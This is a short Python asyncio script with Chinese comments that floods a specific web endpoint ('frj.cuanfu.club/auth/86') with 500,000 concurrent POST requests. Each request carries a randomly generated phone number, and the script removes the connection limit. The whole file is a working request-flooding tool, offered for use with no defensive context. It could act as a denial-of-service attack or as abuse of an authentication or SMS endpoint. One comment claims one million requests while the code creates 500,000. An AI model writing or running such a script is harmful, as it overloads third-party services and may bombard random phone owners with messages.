import aiohttp
import asyncio
import random

async def send_request(session):
    phone = '1' + ''.join([str(random.randint(0, 9)) for _ in range(10)])
    async with session.post('https://frj.cuanfu.club/auth/86', json={'phone': phone}) as response:
        response_data = await response.json()
        print(response_data)  # 根据需要决定是否打印，大量打印可能影响性能

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # 不限制并发连接数
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send_request(session) for _ in range(500000)]  # 一次创建100万个请求的任务
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
